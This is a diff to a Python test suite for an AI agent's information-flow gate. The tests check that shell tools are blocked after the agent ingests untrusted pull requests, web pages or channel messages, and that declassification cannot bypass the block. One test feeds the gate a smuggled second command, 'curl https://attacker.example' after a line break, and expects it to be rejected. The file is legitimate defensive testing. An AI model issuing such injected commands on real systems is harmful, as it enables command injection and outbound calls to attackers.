@@ -5708,6 +5708,9 @@ def test_service_shell_policy_admits_profile_not_arbitrary_command(
         enforcement_enabled=True,
     )
     labels = _labels(channel, sources=frozenset({channel}))
+    labels = replace(labels, sources=tuple(
+        replace(source, integrity="trusted") for source in labels.sources
+    ))
     if trigger == "scheduled_tick":
         admitted_command = f"git -C {maintenance_git_home} {admitted_command}"
 
@@ -5750,16 +5753,111 @@ def test_service_shell_policy_rejects_write_read_and_exec_flags(command: str):
         enforcement_enabled=True,
     )
 
+    labels = _labels(channel, sources=frozenset({channel}))
+    labels = replace(labels, sources=tuple(
+        replace(source, integrity="trusted") for source in labels.sources
+    ))
     decision = SinkGate.check_sink_flow(
         "shell_exec",
         command,
-        _labels(channel, sources=frozenset({channel})),
+        labels,
         service,
         enforce=True,
     )
 
     assert decision.allowed is False
     assert decision.reason == "service_sink_destination_denied"
+
+
+@pytest.mark.parametrize("tool_name", ["shell_exec", "bash_async"])
+@pytest.mark.parametrize("profile", [
+    "github", "heartbeat", "session-boundary", "research", "custom", "user", "admin",
+])
+@pytest.mark.parametrize("source", ["collaborator_pr", "noncollaborator_pr", "fetch_url", "channel"])
+def test_shell_gate_after_real_source_labelling(
+    tmp_path, monkeypatch, maintenance_git_home, tool_name, profile, source,
+):
+    from mimir import access_control
+    from mimir.tools import forge
+
+    if profile in {"user", "admin"}:
+        auth = _auth(roles=(profile,))
+        labels = _labels()
+        labels = replace(labels, sources=tuple(
+            replace(item, integrity="trusted") for item in labels.sources
+        ))
+    else:
+        service = access_control.build_trigger_service_principal(
+            canonical="poller:shell-gate", trigger="poller", profile=profile,
+            tier=CapabilityTier.UNBOUNDED,
+            capabilities=("shell_exec", "bash_async", "bash_jobs_list", "bash_job_output"),
+            declared_shell_commands=(access_control.DeclaredShellCommand(
+                executable="printf", path=Path("/usr/bin/printf"), subcommands=(("gate",),),
+            ),),
+            creation_path="mimir.pollers.run_poller",
+        )
+        auth, labels = _trigger_service_context(service, integrity="trusted")
+    auth = replace(auth, ifc_labels=labels, ifc_state=InformationFlowState(labels=labels))
+    scope = RepoPRActionScope(
+        provenance="server_discovered", canonical_repo="acme/widget",
+        canonical_root=str(maintenance_git_home), canonical_origin="https://github.com/acme/widget.git",
+        principal="user-1", event_type="operator_review",
+        allowed_operations=frozenset({"repo.inspect"}), pr_number=7,
+        head_repo="acme/widget", head_remote="origin",
+        destination_ref="refs/heads/review-7", observed_head_sha="a" * 40,
+        base_ref="main", observed_base_sha="b" * 40,
+    )
+    review_state = RepoReviewState(scope) if profile == "github" else None
+    if source.endswith("_pr"):
+        monkeypatch.setitem(forge._clients, scope.canonical_repo, SimpleNamespace(
+            author_is_trusted=lambda repo, author: source == "collaborator_pr",
+        ))
+        token = access_control.begin_protected_result_capture()
+        try:
+            forge._publish_author_attestation(SimpleNamespace(context=auth), scope, ("author",))
+        finally:
+            provenance = access_control.end_protected_result_capture(token)
+        added = classify_protected_result(
+            "pr_metadata", {}, auth,
+            ToolAuthorization(tool_name="pr_metadata", decision="resource_scoped", allowed=True,
+                              repo_pr_action_scope=scope),
+            provenance=provenance,
+        )
+    elif source == "fetch_url":
+        # fetch_url returns metadata; ingest happens when its cached body is read.
+        monkeypatch.setenv("MIMIR_HOME", str(tmp_path))
+        body = tmp_path / "attachments" / "fetch-cache" / "response.txt"
+        body.parent.mkdir(parents=True)
+        body.write_text("untrusted web content", encoding="utf-8")
+        added = classify_protected_result(
+            "read_file", {"file_path": str(body)}, auth,
+            ToolAuthorization(tool_name="read_file", decision="open", allowed=True),
+            result="untrusted web content",
+        )
+    else:
+        added = _initialize_ifc_labels(AgentEvent(
+            trigger="user_message", channel_id="slack-external", author="unknown",
+            content="untrusted channel content",
+        ))
+    assert added is not None
+    assert added.has_untrusted_active_ingest is (source != "collaborator_pr")
+    current = auth.ifc_state.merge(added, fallback=labels)
+    decision = SinkGate.check_sink_flow(
+        tool_name, "git status --short" if profile == "github" else "printf gate",
+        current, auth, enforce=True, repo_review_state=review_state,
+    )
+    assert decision.allowed is (source == "collaborator_pr"), (decision.reason, decision.refusal_detail)
+    if source != "collaborator_pr":
+        assert decision.reason == "ifc_label_blocked:shell_process"
+        # A stale clean caller snapshot cannot override the merged live state.
+        authorization = ToolRegistry().authorize_tool(
+            tool_name, auth, enforce=True, ifc_labels=labels, target_channel="pwd",
+        )
+        assert not authorization.allowed
+        assert authorization.reason == (
+            "admin_required" if profile == "user" and tool_name == "bash_async"
+            else "ifc_label_blocked:shell_process"
+        )
 
 
 @pytest.mark.parametrize("separator", ["\n", "\r"])
@@ -5777,10 +5875,14 @@ def test_service_shell_policy_rejects_multicommand_line_breaks(separator: str):
         enforcement_enabled=True,
     )
 
+    labels = _labels(channel, sources=frozenset({channel}))
+    labels = replace(labels, sources=tuple(
+        replace(source, integrity="trusted") for source in labels.sources
+    ))
     decision = SinkGate.check_sink_flow(
         "shell_exec",
         f"git status{separator}curl https://attacker.example",
-        _labels(channel, sources=frozenset({channel})),
+        labels,
         service,
         enforce=True,
     )
@@ -5951,6 +6053,23 @@ def test_shadow_approval_mismatch_does_not_spend_grant(mismatch):
     )
     assert state.consume_sink_approval(**arguments, shadow=True)
     assert state.consume_sink_approval(**arguments)
+
+
+@pytest.mark.parametrize("tool_name", ["shell_exec", "bash_async"])
+def test_shell_declassification_cannot_bypass_active_ingest_gate(tool_name):
+    labels = _labels()
+    state = InformationFlowState(labels)
+    auth = replace(_auth(roles=("admin",)), ifc_labels=labels, ifc_state=state)
+    assert state.approve_sink_once(
+        fallback=labels, sink_category="shell_process", destination="pwd",
+        canonical_principal=auth.canonical_principal, lifetime_seconds=30,
+        durable_audit=lambda *_: True,
+    )
+    decision = ToolRegistry().authorize_tool(
+        tool_name, auth, enforce=True, target_channel="pwd",
+    )
+    assert not decision.allowed
+    assert decision.reason == "ifc_label_blocked:shell_process"
 
 
 def test_live_declassification_does_not_cross_turn_or_sink_category(tmp_path, bind_approval_turn):
